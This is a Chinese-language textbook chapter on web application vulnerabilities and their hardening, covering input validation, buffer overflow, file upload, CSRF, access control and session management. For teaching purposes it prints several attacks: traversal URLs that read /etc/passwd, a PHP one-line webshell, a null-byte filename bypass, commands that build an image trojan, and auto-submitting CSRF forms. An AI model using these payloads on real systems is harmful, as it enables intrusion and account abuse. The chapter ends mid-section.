# 第七章 Web 应用漏洞攻防
## 引言
随着网络时代的高速发展，互联网已经逐渐成为了人们与外界沟通、认识世界的一个重要手段与载体，而 Web 应用作为其中最为直接的工具，在网络安全领域扮演着举足轻重的角色。在 Web 1.0 时代，Web 安全问题主要聚焦在 Web 应用服务器端动态脚本的安全，目标是获得服务器的控制权。到了 Web 2.0 时代，Web 应用前端安全开始引起广泛关注，黑客针对 Web 应用的各种漏洞利用思路也越来越有创意性与技巧性。随着敏捷开发及各类动态脚本语言的繁荣发展，Web 前后端开发框架层出不穷，这些都给 Web 应用漏洞攻防领域带来了越来越多的新思路和新挑战。
## Web 安全模型
在 Web 应用安全领域，工业界往往习惯于将其划分为两部分：客户端脚本安全（即前端安全）及服务端脚本安全（即后端安全）。这种划分方法是借鉴了 Web 应用开发普遍采用的前端和后端分工方式，并没有考虑到漏洞触发条件和位置的更具体差异。可以说上述划分方式没有从 Web 应用内部运行原理及漏洞真正的触发点出发，前后端安全这种划分方式不利于初学者对于 Web 应用漏洞原理的系统学习与深入理解。

在研究 Web 应用漏洞之前，首先需要了解 Web 应用程序服务模型，对一次客户端（PC 时代主要指代的是浏览器；移动互联网和物联网时代的很多 App 要么是使用了 HTTP 协议的客户端实现，要么是直接嵌入了一个定制化的浏览器引擎，这些均可以视为披着原生应用外衣的浏览器）发起的请求的整个生命周期有一个完整的认知，才能更好地理解 Web 应用相关安全问题，从而展开深入研究。下图是一个 Web 应用程序服务简化模型图  
![Web 应用服务简化模型图](../images/chapter_7_igbag/image01.png)

从一次客户端发起的请求来看，请求数据首先**输入**Web 应用程序，在数据到达 Web 应用程序内部后，相关服务端代码开始处理数据。典型的数据处理逻辑包括了对数据库或第三方 API 等外部**后台**服务的远程调用，此时请求数据就有机会 **进入后台** 。后台服务处理完请求数据后返回数据给相关服务端的请求发起代码，经过进一步的数据处理，服务端代码将本次客户端请求结果以 **输出**响应数据的方式返回给请求发起者——客户端。服务端代码的运行环境包括了一系列软件构成的一个运行环境堆栈，例如：**中间件**、**操作系统**、**服务器硬件**、**服务器所在网络**等。我们一般将这个运行环境堆栈又称为服务端平台。

对于一个具体的 Web 应用程序漏洞利用程序而言，其成功触发一定离不开一个具体的漏洞利用代码执行过程。这个漏洞利用代码最终执行的具体位置，我们称之为**漏洞触发点**。有了漏洞触发点的概念，依据 Web 应用程序服务简化模型，我们定义一套 **Web 漏洞模型**。按照 **漏洞触发点** 的不同，我们将 Web 漏洞分为五大类。
- `输入相关的通用漏洞`：这一类 Web 漏洞，特指漏洞触发点在 Web 应用程序的服务端代码，且普遍存在于所有服务端脚本环境。对于不同的服务端脚本环境而言，这类漏洞的利用方式往往具有通用性、平台无关性或平台差异性小等特点。这类漏洞的存在，主要源于对于客户端发送请求的不当处理。这类典型漏洞包括 CSRF 攻击、文件上传漏洞、字符编码漏洞等。
- `服务端脚本相关漏洞`：本类漏洞可以进一步细分为设计模式类漏洞、语言特性误用类漏洞和第三方组件缺陷。设计模式类典型漏洞如：脆弱的访问控制、脆弱的认证和会话管理，语言特性误用类如：文件包含、XXE、反序列化漏洞。第三方组件缺陷又被归结为供应链安全问题，现代软件和信息系统已经不再是所有代码都是自己编写，软件工程里被奉为圣经的「可重用」原则催生了大量的开源和商用软件组件，被这些存在漏洞的「可重用」组件影响的信息系统往往只能依赖于相关组件漏洞的修复来达到加固自身的目的。本类 Web 漏洞与输入相关的通用漏洞一样，漏洞触发点在 Web 应用程序的服务端代码。不同的是，对于不同组合服务端脚本环境的漏洞攻击向量构造方式差异较大。基于一些动态脚本语言的特性，某些漏洞可能仅在特定的服务端脚本环境中才能被利用。举例而言，由于 PHP 语言的语法特性，可以在代码中通过调用 include()、require() 等方法加载本地甚至是以 URL 方式指代的互联网脚本文件，实现跨文件的动态代码调用执行。当被调用的文件可以被攻击者控制时，就可以触发文件包含漏洞。类似的特性在 JSP、ASP 脚本中同样存在，而在其他服务端脚本语言中则几乎不存在。这类漏洞的存在虽然也是源于服务端脚本对输入数据的不当处理，但利用这一类漏洞的方法则更依赖特定脚本运行环境。
- `后台相关漏洞`：当客户端发来的请求作为 Web 应用程序的输入，已经被服务端脚本进行处理后，进一步通过模型操作或 API 程序调用请求并操作了第三方的服务或应用从而进入到了后台。这一类 Web 漏洞，特指漏洞触发点在 Web 应用程序的后端第三方应用或服务，例如：数据库（关系型数据库、非关系型数据库）、第三方 API 等。对于输入数据的不当处理，危险函数、危险方法的调用是、客户端输入数据字符串拼接后直接交给后台执行是造成这类问题的常见原因。
- `输出相关漏洞`：输出相关漏洞特指漏洞触发点在客户端环境（例如 Web 浏览器）中，但触发这一类漏洞的攻击代码则来自于服务端脚本代码对客户端请求数据的不完善数据清洗操作。基于客户端代码执行环境（例如浏览器的 HTML、CSS 代码渲染和 JavaScript 代码执行）的一些特性，可能导致某些非预期的客户端脚本执行（例如：跨站点脚本执行漏洞）或恶意内容显示（例如用户界面重绘类漏洞可以导致点击劫持、模态登录对话框覆盖钓鱼等）。
- `平台相关漏洞`：由于 Web 应用程序运行在系统层面，对底层运行环境配置有着很强的关联性及依赖性。因此一切中间件、操作系统、服务器硬件、服务器所在网络的不当配置都会增加应用程序的运行时风险，甚至引入额外的漏洞。这一类漏洞特指漏洞触发点位于 Web 应用程序运行所依赖的运行时环境，漏洞产生原因则主要归结为程序运行环境的缺陷配置或老旧缺陷版本。一个典型的例子是 CVE-2010-2266 Nginx 服务器拒绝服务攻击漏洞。

## 漏洞攻防训练环境搭建
### PHP Web 漏洞复现环境
```bash
# 开启 SSH 服务
systemctl start ssh
 
# 设置 SSH 服务开机自启动
systemctl enable ssh
 
# 检查当前系统中是否已安装 PHP 命令行解释器
php -v
 
# 如果输出了 PHP 解释器版本信息，则跳过以下安装步骤
# 直接跳到「启动 PHP 内置开发版 Web 服务器」
 
# 安装当前发行版支持的最新版 PHP 命令行解释器
apt update && apt install php-cli
 
# 如果需要安装「旧版本」PHP 解释器，推荐使用 Docker
# https://hub.docker.com/_/php
 
# 安装完毕后检查当前安装的 PHP 命令行解释器版本
php -v
 
# 启动 PHP 内置开发版 Web 服务器
# 建议在 tmux 会话中执行该命令
php -S 0.0.0.0:8080
 
# 使用浏览器访问虚拟机的任意一个可用网卡上的 IP 地址
# 端口号设置为 8080
# 例如 http://127.0.0.1:8080/
```
### WebGoat 漏洞攻防训练环境
访问 https://github.com/c4pr1c3/ctf-games 获得本课程定制的 Web 漏洞攻防训练环境。
> 或访问国内镜像仓库 https://gitee.com/c4pr1c3/ctf-games
```bash
# 启动 webgoat 系列服务
$ cd owasp/webgoat/ && docker-compose up -d
# 查看启动的服务
$ dcokeer ps
```
## 输入相关的通用漏洞
- 不要相信任何来自客户端的提交数据
    - 客户端的任何数据校验都是纸老虎
        - 客户端的数据校验机制防君子不防黑客
- 数据和指令/代码必须严格区分
    - 缓冲区溢出时的机器指令运行在可执行堆栈上
    - SQL 注入时执行任意SQL语句
    - XSS 时执行任何客户端脚本代码（JS/Flash AS）
    - 文件上传时上传服务端脚本代码在服务器端执行任意代码
### 未验证的用户输入
缺陷代码示例：
```php	
$file = $_GET['file'];
echo file_get_contents($file);
```
[file_get_contents文档解释](https://www.php.net/manual/zh/function.file-get-contents.php)  
利用方法示例：
```bash
http://victim.com/vul/ViewServlet?url=http://internal/weblogic/console
http://victim.com/vul/ViewServlet?url=file:///etc/passwd
http://victim.com/vul/ViewServlet?url=../../../../../../../etc/passwd
```
上面三个恶意输入的例子，依次分别展示了攻击者通过这个简单的应用程序便可以间接的实现：后台程序枚举和扫描、读取服务器上的敏感文件、遍历搜索服务器上文件。

攻击者可以篡改 HTTP 请求消息 的任何一个部分
- HTTP 请求行
- HTTP 请求头
- HTTP 请求体

常见的输入篡改攻击
- 强制浏览
- 命令注入
- 跨站点脚本攻击
- 缓冲区溢出攻击
- 格式化字符串攻击
- SQL 注入
- Cookie 毒化
- 隐藏域控制

此类漏洞的源代码级别成因可归结为：
- 只在客户端进行了输入验证。
- 输入数据过滤时未进行规范化，导致过滤措施被绕过。
- 过滤后引入新漏洞

典型漏洞利用方法
- 拦截 HTTP 请求数据
- 修改数据
- 继续发送篡改后数据

典型漏洞利用工具
- HTTP 协议调试工具
- BurpSuite
- 浏览器内置的开发者工具

针对未验证的用户输入的源代码级别常用安全加固事项有：
- 所有的用户输入需要在服务端进行集中的统一验证，如：请求参数、Cookies、HTTP 请求头和请求体等。
- 不“滥用”隐藏域，重要数据应存储在 Session 中或对请求参数进行签名验证。
- 对于请求参数需要严格验证其类型。例如：数据类型（字符串、整数、浮点数等）、最小和最大长度、是否允许NULL 字符、参数是否是必需的、数字的取值范围、特定模式（正则表达式）与白名单机制。
- 服务器返回给客户端的重要参数、赋值使用 HMAC 进行参数签名
    - 千万不要使用 MD5、SHA-XXX 之类的摘要算法对参数进行摘要计算，也不要使用基于“秘密盐值”的 MD5、SHA-XXX 之类的摘要算法对参数进行摘要计算
        - Hash 长度扩展攻击可以用来伪造消息和对应的散列值
    - 对客户端提交的请求校验关键逻辑代码中的参数，一旦 消息完整性签名 校验失败，说明客户端尝试篡改请求参数攻击，代码逻辑直接跳过后续业务逻辑代码，给客户端返回统一的错误信息
### 缓冲区溢出漏洞
缓冲区溢出（Buffer Overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
根据 Web 应用缓冲区溢出漏洞的利用目的及危害对其进行划分，可以分为如下两类：
- 拒绝服务。攻击者可以通过将过量的输入数据插入到可修改的注入向量中来溢出缓冲区，造成程序有关数据被覆盖、修改，最终导致 Web 应用进入挂起甚至崩溃状态，从而达到拒绝服务的效果。这类缓冲区溢出攻击往往实现难度较低。
- 任意代码执行。这种情况下，攻击者同样通过将过量的输入数据插入到可修改的注入向量中来溢出缓冲区，溢出的数据中包含恶意指令且恶意指令被精确填充到可执行堆/栈（内存）中进而导致恶意代码被执行。这类攻击手段主要通过覆盖修改 EIP 寄存器，使得程序运行过程中的返回地址发生改变，并精确指向填充数据中的可执行脚本 shellcode 中，最终导致恶意代码的执行。这类缓冲区溢出攻击往往需要较强的攻击技巧，难度也较高。

应用程序的缓冲区中存在过量的输入数据，溢出的数据中则包含恶意指令且恶意指令被精确填充到可执行堆/栈（内存）中进而导致恶意代码被执行。

Java Web 应用程序存在的缓冲区溢出风险
- OutOfMemoryError
- CVE-2011-0311
- CVE-2009-1099

[据统计 PHP 的缓冲区溢出相关漏洞从 1997 到 2018 年累计超过 150 个。](https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/opov-1/PHP-PHP.html)  
PHP Web 应用程序中缓冲区溢出：
- CVE-2011-3268
- CVE-2008-5557
- CVE-2008-2050
- CVE-2007-1399
- CVE-2007-1381


引起 Web 应用的缓冲区溢出的主要原因是在对于输入数据没有经过校验的情况下，直接将其作为参数调用了底层编程语言的危险函数。另外一种情况是， Web 应用直接调用了存在缓冲区溢出漏洞的本地应用程序，通过 Web 应用这一外在调用者来触发了这一漏洞。因此，可以认为缓冲区溢出漏洞的触发原因与应用程序运行所依赖的底层平台、架构具有很强的关联性。

安全加固方案
- 避免使用本地代码
- 避免直接调用本地应用程序
- 及时更新应用运行环境
    - Java 虚拟机的安全更新补丁
    - PHP 语言的安全更新补丁
- 限制 Web 应用程序的运行权限
    - 沙盒技术

### 文件上传漏洞
在使用互联网的过程中，我们常常会使用到 Web 应用程序中的文件上传功能，比如使用社交软件上传图片，发送邮件附带附件、提交文档等等。  
对于一个 Web 应用程序而言，客户端所上传的文件就是整个程序的输入数据。对于“文件上传”这个正常的业务需求，如果 Web 应用的服务端没有对于用户所上传的文件使用足够安全的处理逻辑，则有可能会造成文件上传漏洞。  
通过该漏洞，攻击者可以通过上传 Web 脚本（一般称为 WebShell）达到远程控制服务器、篡改服务器上文件（特别的，可以实现网页挂马攻击）等效果，或者上传病毒、木马文件诱使用户下载以达到恶意代码传播扩散的目的。  
在大部分情况下，攻击者对于文件上传漏洞的攻击利用都是通过 `WebShell` 形式实现的。PHP 的“一句话木马”就是一个典型的 `WebShell` ：
```php
<?php eval($_REQUEST['cmd']); ?>
```
[推荐的上传漏洞的学习](../opt/data/upload_labs_setup.md)（upload-labs测试训练环境）

通常在这种情况下，文件上传漏洞的成因可以归结为「用户上传的文件能够直接被服务器当作服务端代码执行」。  
该类型攻击的成功实现，需要满足两方面条件。  
第一，为了使用户上传文件成功被解析，需要使上传后文件能够通过 Web 程序定义的 URL 路由规则访问到。  
第二，文件内容即使经过格式化、压缩等处理被修改，也需要维持其“可被执行”的状态及条件。

大部分 Web 应用程序开发者对于上传文件功能实现较为谨慎。常常采用下述两类方法对用户上传文件的文件格式进行验证和过滤。

1. 根据文件扩展名判断。

一些应用仅仅在客户端进行文件扩展名的校验，这种验证机制可以通过使用代理、断点上传工具等轻松伪造并绕过。即使在应用服务器端对文件扩展名进行校验，同样可能存在被绕过的风险。  
基于黑名单的方式通常被视为不安全的验证方式，黑名单往往无法涵盖所有可被服务器环境解释或引用的危险文件格式类型。  
基于白名单的方式相对较为安全，但 [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2006-7243) %00 字符截断问题 和 [CVE-2015-2348](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2015-2348) move_uploaded_file() 第 2 个参数存在 %00 字符截断问题 均可能绕过这种验证机制。

如果该代码在存在 `CVE-2006-7243` 漏洞的 PHP 运行环境（`PHP 5.3.4` 之前版本均受影响）中执行。如应用本来只允许上传扩展名为 `.jpg` 的图片，但攻击者可以构造文件名 `eval.php%00.jpg`（其中 %00 是 NULL 字符的 URL 编码形式），`.jpg` 扩展名骗过了应用的上传文件类型检测，实际在服务器上创建的文件名将是 `eval.php` 。

如果代码所在 `PHP` 执行环境存在 `CVE-2015-2348` 漏洞（主要影响 PHP `5.5.0 ~ 5.5.22 、5.6.0 ~ 5.6.6` 系列版本），则服务端脚本执行 `move_uploaded_file($_FILES['pictures']['tmp_name'], "$uploads_dir/$filename")`; 的效果却是创建了文件` /var/www/html/uploads/eval.php` 。至此，攻击者又一次成功绕过了代码中对文件扩展名的校验在服务端上存储了一个可以被 PHP 引擎解析执行的脚本文件。由于 `CVE-2015-2348` 只有在 `$filename` 是从 `POST、GE`T 方法的请求参数中读取时才有效，因此该漏洞在实战中比较鸡肋，因为大多数 PHP 程序员都是使用 `$_FILES` 数组获取用户上传的文件名。

2. 根据文件头部若干字节数据判断。 

既然根据文件扩展名判断文件类型不可靠，于是有些服务端程序员想到了用 `文件幻数` 匹配的方式来判断文件类型是否允许或非法。  
`幻数`（Magic Number）可以用来标记文件或者协议的格式，很多文件使用幻数标志来表明该文件的格式。  
例如 `GIF` 格式文件的前 4 字节用 16 进制表示为 `47 49 46 38`，`PNG` 格式文件的前 4 字节用 16 进制表示为 `89 50 4e 47`，但微软 Office 系列的 `.docx` 、`.pptx` 和 `.xlsx` 格式文件的前 4 字节都是 `50 4B 05 06`。虽然会有无法精确识别文件类型的缺陷，但在大多文件上传应用仅允许上传图片类型文件时，使用幻数匹配的方式是一种常见的“有效”手段。但攻击者只需要将想要上传执行的脚本附加到白名单文件格式的文件头之后，再使该文件被脚本语言解释器所解释执行即可达成文件上传漏洞利用。  
为了使得非脚本文件扩展名文件被当作目标脚本在服务端解释执行，通常需要配合其他运行环境相关的漏洞，例如：`CVE-2013-4547`允许攻击者通过一个 URI 中的未转义空格字符绕过 `Nginx` 服务器的后缀名限制实现把非脚本文件扩展名文件解析成脚本文件扩展名访问执行；`Nginx` 的 CGI 参数配置错误导致访问形如 `/image/1.jpg/1.php` 这样的 URI 实际被解析成加载服务器上的 `/image/1.jpg` 文件当作 PHP 脚本执行。最终，借助服务器 URI 解析类漏洞，文件上传漏洞利用成功绕过了「根据文件头部若干字节数据判断」的防御机制。

例如，某网站提供了一个上传文件的功能，仅仅允许用户上传 `JPEG` 格式的图片，并通过上传文件的文件头进行校验。假设攻击者已经拿到了一个标准的 `JPEG` 文件 `standard.jpg` 和一个一句话木马脚本 `eval.php`，则其可直接通过在 `Windows` 上的 `CMD` 控制台运行指令 `copy standard.jpg/b eval.php/a exploit.jpg` 或在 `Linux` 上的终端中运行指令 `cat standard.jpg eval.php > exploit.jpg` 将两个文件进行拼接，即可完成图片木马的制作，从而达到绕过服务端验证的目的。

对于**文件上传漏洞**的加固和修补有如下几种手段，建议尽可能多的组合使用：

- 对于用户上传文件的存储目录应该禁用脚本解释引擎对该目录中文件的解释执行功能，即使攻击者上传了恶意文件也无法成功执行、利用。
- 在服务端代码使用文件后缀名白名单，避免使用黑名单的过滤方式。
- 服务端代码运行依赖环境保持更新（如 Web Server、第三方文件上传组件、脚本运行引擎 等）。
- 对于图片上传类场景，在不需要保存原始文件的情况下，可以对图片进行二次渲染，既可以发现和过滤掉异常格式的图片，也可以破坏可能嵌入在图片中的恶意代码完整性。
- 保存文件到服务器上的文件系统时，重写用户提供的文件名为用户不可控的由安全字符构成的文件名，例如用文件散列值来重命名上传的文件名。

3. [文件上传漏洞详细补充](../opt/upload_attack.md)
### CSRF漏洞
跨站请求伪造（Cross Site Request Forgery, CSRF），也被称为 One Click Attack 或者 Session Riding ，是一种在用户不知情条件下攻击者利用网站信任已认证用户身份执行非用户预期行为的漏洞。CSRF 漏洞往往是 Web 漏洞中最容易被忽略的漏洞，虽然通过遵循安全开发规范可以避免这种漏洞的出现，但依然有很多开发者并不了解正确的 CSRF 防御性编程方法，在代码中留下了 CSRF 漏洞。

`Cookie` 作为网站为了辨别用户身份而存储在客户端的数据，经常被用于验证客户端的用户身份，可以起到会话识别、会话保持的作用。当客户端第一次访问某网站时，服务端往往会返回一个 `Cookie` 作为客户端的凭证，客户端在后续的网站访问过程中会自动发送该 `Cookie` 。目标网站通过读取 `Cookie` 即可得知用户的相关信息，根据识别出的用户身份提供相关权限的页面展示和交互功能，所以用户在使用 Web 应用的过程中不用频繁输入用户名、密码来验证身份。

CSRF 最主要是利用了「浏览器会按照一定的规则在后台自动发送 Cookie 给 Web 服务器」这个特性，被攻击者在访问到包含 CSRF 攻击代码的网页时会由浏览器在后台自动执行包含目标网站 Cookie 的攻击代码完成仿冒被攻击者身份执行恶意操作目的。一个典型的 CSRF 漏洞利用过程如下：
1. 用户登录了受信任的网站 A，并在浏览器本地存储了该 Cookie。
2. 在不登出网站 A 的前提下（关闭浏览器并不代表 Cookie 过期或失效），访问了恶意网站 B。
3. 恶意网站 B 要求用户（不展示任何有关网站 A 的页面信息）发出一个请求（POST 或 GET）到网站 A。对于这一步的攻击主要是利用了「浏览器在访问目标 Web 站点时会自动将保存在浏览器中的目标站点 Cookie 发送过去」这个特性。以被攻击者在目标站点的用户身份（目标站点根据当前发送出去的 Cookie 来验证用户身份）发起伪造的 HTTP 请求。
4. 根据上一步恶意网站的操控行为，用户在不知情的前提下，带着自己在网站 A 获得的 Cookie 向网站 A 发送了请求。
5. 存在 CSRF 漏洞的目标受信任站点（网站 A）误以为所有通过了身份验证的请求都是「代表了用户本人意图」而没有考虑到通过 CSRF 漏洞利用方式发起的请求是「被劫持 Cookie 或其他身份认证凭据后伪造」的自动化、非用户本人主动发起的请求。因此受信任的网站 A 根据 Cookie 信息，认为这是可信任用户发送的请求，接受并处理了这个请求。

在上述典型 CSRF 漏洞利用过程中，CSRF 漏洞存在于网站 A 的服务端代码，用户访问恶意网站 B 并不是触发 CSRF 漏洞的必要条件。如果网站 A 同时存在跨站点脚本漏洞，则攻击者通过在网站 A 上利用跨站点脚本漏洞方式也可以让用户在不知情情况下，触发相关页面的 CSRF 漏洞攻击。

以下 PHP 脚本片段是一个包含 CSRF 漏洞关键代码的实例：
```php
<?php
session_start();
if (is_authorized()){
  if (isset($_GET['userid'])){
    add_friend($_GET['userid']);
  }
}
```
假设一个用户信任的社交 Web 应用程序在服务端实现了一个添加好友的接口，可以使用形如 `http://victim-trusted.com/Addfriend.php?userid=123` 的 GET 请求来进行添加好友的操作。

该脚本实际上违反了 HTTP 规范，没有使用表单提交的方式（即 POST 方式）而是使用 GET 请求更新资源。攻击网站只需在 HTML 代码中构造如下一个带有危险请求链接的图片即可使受害者在不知情的情况下主动添加陌生人为好友。
```html
<img src="http://victim-trusted.com/Addfriend.php?userid=233">
```
服务端脚本使用 POST 参数的方式可以从一定程度上加大漏洞利用的难度，提高安全性，但 CSRF 漏洞依旧是存在的。
```html
<html>
<head>
<script type="text/javascript">
function steal()
{
  iframe = document.frames["steal"];
  iframe.document.Submit("Addfriend");
}
</script>
</head>
<body onload="steal()">
<iframe name="steal" display="none">
  <form method="POST" name="Addfriend"　action="http:// victim-trusted.com/Addfriend.php">
    <input type="hidden" name="userid" value="233">
  </form>
</iframe>
</body>
</html>
```
上述代码中，恶意网站通过嵌入一个包含恶意表单的隐藏 `iframe`，可以通过 `JS` 动态执行的方法，在受害者不知情的情况下自动提交 `POST` 请求，从而主动添加了陌生人为好友。

CSRF 漏洞的源代码级别加固有以下四种方法：

1. 对 `HTTP Header` 中的 `Referer` 字段进行验证。
    - `HTTP Referer` 字段记录了该 `HTTP` 请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。
        - 比如社交网站的添加好友操作是通过用户访问 `http://victim-trusted.com/Addfriend.php?userid=123` 页面完成，用户必须先登录 `victim-trusted.com`，然后通过点击页面上的按钮来发送添加好友的请求。该请求的 `Referer` 值是当前页面的 URL (以 `victim-trusted.com` 开头)。而对于攻击者而言，利用 `CSRF` 漏洞构造的请求的 `HTTP Referer` 值只能是指向攻击者的网站。
        - 只需要对于每一个 `POST` 请求验证其 `Referer` 值，如果是以 `victim-trusted.com` 开头的域名，则说明该请求是来自本网站的合法请求；
        - 如果 `Referer` 是其他网站的话，就有可能是 `CSRF` 攻击，则拒绝该请求。
2. 在 `POST` 请求中添加 `token` 作为参数并验证。
    - 这种安全策略被各种 `Web` 框架广泛采用（包括 `Laravel`等）。
    - CSRF 漏洞能够被利用的主要原因就是用户的全部验证信息均保存在 `Cookie` 中，攻击者可以在不接触到 `Cookie` 的前提下完成身份验证。
        - 只需在请求中设置一个攻击者所无法伪造的、不可预测的 token，且保证这个 `token` 与 `Cookie` 是毫无关联的。
        - 此外，还应保证这个 `token` 是独立且不重复使用的。
        - 在服务端验证用户身份时应同时对 `Cookie` 及 `token` 进行验证。
            - 这个 `token` 被称为 `csrftoken`，在 `HTML` 的表单中，该字段的输入域往往是隐藏的。
3. 在 `HTTP` 头中自定义属性并验证。
    - 自定义属性的方法也是使用 `token` 并进行验证，和前一种方法不同的是，这里并不是把 `token` 以参数的形式置于 `HTTP` 请求之中，而是把它放到 `HTTP Header` 中自定义的属性里。
    - 当前一种方法实现不便的情况下，可以采用这种安全策略进行系统加固。
4. 添加验证码并验证。
    - 可以在表单中增加随机验证码，采用强制用户与 Web 应用进行交互的方式防止 CSRF 攻击。
        - 登录验证、交易等针对危险操作的接口
        - 但强制所有请求都使用验证码往往也是不现实的。
    - 实战中，Web 程序往往采用在 POST 请求中添加 token 作为参数并验证的方法作为防止 CSRF 漏洞的安全策略。
        - 不要将 `csrftoken` 作为 GET 参数进行请求，防止请求地址被记录到浏览器的地址栏，也防止 token 通过 Referer 泄露到其他网站。

## 服务端脚本相关漏洞
- 脆弱的访问控制
- 认证和会话管理缺陷
- 文件包含
- XXE 注入
- 反序列化漏洞
- 第三方组件缺陷
### 脆弱的访问控制
3 类常见的存在脆弱访问控制缺陷的 URL 示例
```
# 示例一：⽂档/软件的下载链接地址保护 
http://victim.org/docs/1.doc
http://victim.org/docs/download.do?id=1

# 示例二：Web应用程序的后台管理⼊⼝地址
http://victim.org/admin
http://victim.org/console/login

# 示例三：后台操作未执⾏用户身份认证和授权检查
http://victim.org/users/deleteUser.do?userid=001
http://victim.org/users/addUser.do?userid=001
```
示例一的缺陷主要来自于受访问控制保护的服务器上存储文件能够被轻易的枚举和预测出对应的 URL。攻击者只需要「猜解出」文件的 URL，就可以访问到对应的文件。服务器端代码未能检查当前请求是否持有被访问 URL 所需要的「权限令牌」

示例二的缺陷在于系统设计者认为只要不公开（在其他页面添加外链引用）后台管理系统的入口页面，则攻击者就找不到攻击后台管理系统的入口，进而放松了对后台管理入口的身份认证安全加固（例如未启用双因素认证机制、口令爆破锁定机制等）。服务端代码的设计者错误的假设了「信息孤岛」页面无法被「外人」找到，而忽视了搜索引擎的意外收录、后台管理地址的字典式枚举发现等都可能会让「隐蔽」的后台管理入口暴露在攻击者面前。

示例三的缺陷和示例二的缺陷成因类似，服务端代码的设计者在用户登录之后，根据数据库中查询出来的当前用户所具备的权限列表显示所有可操作的页面和功能链接。同样是错误的假设了没有显示出来的功能链接就无法被非授权用户「访问到」，而忽视了攻击者可能通过 URL 字典枚举和猜解等方式，直接访问「隐蔽」功能的 URL。此时，服务端代码在执行「非授权」访问时，再次忽略了对当前请求是否持有被访问 URL 所需要的「权限令牌」进行检查。

- 可预测 的服务器端对象访问唯一标识
- 强制浏览（直接在浏览器的地址栏中输入 URL ）
- 目录遍历
- 文件访问权限
- 客户端缓存

据此，可以归纳出脆弱的访问控制的主要成因在于：内容或程序功能未能有效的保护以限制只允许合法用户的访问。  
漏洞的成因：
- 认证只发生在用户登录时
- 仅对 URL 进行鉴权，而不是对完整的请求内容进行鉴权
- 未采取集中式的授权管理，而是分散授权管理

除了上述 3 类常见的脆弱访问控制模式之外，客户端缓存、基于客户端数据过滤实现数据访问控制、分散授权管理、服务端 API 缺乏访问速率限制等，均会造成非授权访问危害。

安全加固方案
- 对每个需要保护的请求进行检查，不仅是在用户第一次登录请求时进行检查
- 避免使用自己开发的访问控制，⽽是使用服务端编程框架官方提供或推荐的成熟解决方案。优秀的访问控制框架应满足：
    - 采用声明式而非硬编码的访问控制
    - 集中化访问控制而非分散访问控制
    - 例如：
        - Java 开源框架 Spring 内置的 Acegi 系统
        - PHP 开源框架 Laravel 的第三方基于角色的权限控制框架 Entrust
        - Python 开源框架 Flask 的第三方权限管理框架 Flask-Principal
- 为了防止客户端缓存重要内容，可以在所有服务端响应消息设置 HTTP 请求头或使用 HTML meta 标签。
    - 例如可以设置 HTTP 响应头：Cache-Control: no-store 或 Cache-Control: no-cache, no-store, must-revalidate 禁止客户端缓存当前响应内容。
- 在服务器端使用操作系统提供的访问控制保护文件的未经授权的访问
- 业务模型的访问控制授权建模
    - 在检查当前请求是否持有被访问 URL 所需要的「权限令牌」时应遵循「访问控制权限划分的三角形基本法则」
- 平行权限访问
    - 属主权限检查
    - 注意横向同等权限角色条件下的被访问资源属主权限检查，避免「跨用户」非授权访问行为
- 提升权限访问
    - 使用 ACL

以数据库存储的访问控制列表为例，可以设计类似如下的访问控制矩阵来检查每一次授权访问。
|主键 (id)|主体 (subject)|客体 (object)|
|:--:|:--:|:--|
|1|Alice|/srv/www/upload/1.doc|
|2|Bob|/srv/www/upload/2.doc|

当发生文件访问请求时，可以通过如下的 SQL 语句来检查当前访问是否是授权操作。
```sql
-- 只有当查询结果 > 0 时才说明是授权访问，否则均是非授权访问行为
select count(id) from tb_acl where subject=%user_name% and object=%access_file_path%
```
### 认证和会话管理缺陷
未采用Session cookie，而是在URL中编码已通过认证的用户名和密码  

一个极端简单的脆弱身份认证例子如下 URL 所示：  
`https://victim.org/admin/list.jsp?password=0c6ccf51b817885e&username=11335984ea80882d`

这样直接把明文用户名和口令附加在每一次 HTTP 请求消息中的做法，既容易被基于网络流量劫持的中间人攻击方式截获，同时，利用跨站点脚本漏洞也可以直接读取到认证凭据。  
在实践中更普遍的身份认证流程是：用户的第一次身份认证验证的是用户名和口令是否匹配，一旦通过验证，服务器脚本会通过 HTTP 响应消息头的 `Set-Cookie: auth_key=token` 指令告知浏览器在后续请求的消息头使用 `Cookie: auth_key=token` 的方式来向服务器代码证明自己的身份。

#### 常见会话管理类缺陷
最常见的 Web 应用会话管理功能实现是依赖于客户端的 `Cookie` 和服务端的 `Session` 机制的。  
客户端 `Cookie` 中通常会记录服务端代码设置的一个「随机长字符串」作为 `Session ID`  
服务端代码使用客户端发送来的 `Cookie` 中这个 `Session ID` 在服务端的 `Session` 列表中找到匹配 `Session` 对象，进而就可以知道「用户是谁」。这里的 `Session ID` 我们一般称为「会话令牌」。

常见会话管理类缺陷有 4 大类：

- 会话预测（Session Prediction）指的是攻击者可以「预测」出服务端的合法「会话令牌」，从而达成身份冒用的效果。
- 会话劫持（Session Hijacking）可以通过中间人劫持攻击或跨站点脚本攻击方式拿到用于会话唯一标识的「会话令牌」。本节所举的第一个极端简单的脆弱身份认证例子正是这种类型缺陷。
- 会话固定（Session Fixation）利用到了服务端脚本对于身份认证前使用的「会话令牌」在身份认证通过之后没有更换新「会话令牌」这个设计模式的缺陷，攻击者诱骗受害用户使用攻击者提供的「会话令牌」完成身份认证，这样，攻击者手里掌握的这个「会话令牌」也就相应的同步变为「身份认证通过会话令牌」了。此时，攻击者相当于在并不需要掌握受害用户身份认证凭据的情况下，「克隆」了受害用户的已登录会话。与会话劫持相比，攻击者并不依赖于直接读取到一个已经通过身份认证的「会话令牌」，攻击者初始提供给受害用户的「会话令牌」就是未通过身份认证状态下的。当然，攻击得手之后，会话固定和会话劫持的效果是一致的：攻击者拿到了受害者用户身份对应的有效会话令牌。
- 会话偷渡（Session Riding）是前述跨站点请求伪造的另一种表述。攻击者不需要克隆受害用户的会话，攻击者一次会话偷渡攻击只是借用受害用户保存在客户端的「会话令牌」执行一次受害用户不知情情况下的认证会话操作，攻击者对于受害用户使用的「会话令牌」具体是什么并不知情。
#### 安全加固措施
目前应用较为广泛的身份认证加固方案往往同时集成了多项安全措施，具体包括：

